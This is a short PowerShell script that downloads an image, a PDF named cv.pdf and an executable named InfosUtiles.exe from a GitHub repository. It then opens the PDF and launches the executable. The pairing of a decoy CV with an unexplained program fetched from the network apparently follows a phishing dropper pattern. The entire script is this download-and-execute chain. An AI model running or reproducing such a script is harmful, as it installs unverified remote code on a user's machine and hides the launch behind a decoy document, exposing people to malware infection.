$scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $scriptPath

Invoke-WebRequest -Uri 'https://github.com/ThomasQuiniou/test/raw/main/cat.png' -OutFile 'cat.png'
Invoke-WebRequest -Uri 'https://github.com/ThomasQuiniou/test/raw/main/InfosUtiles.exe' -OutFile 'InfosUtiles.exe'
Invoke-WebRequest -Uri 'https://github.com/ThomasQuiniou/test/raw/main/cv.pdf' -OutFile 'cv.pdf'

Start-Process './cv.pdf'
Start-Process './InfosUtiles.exe'
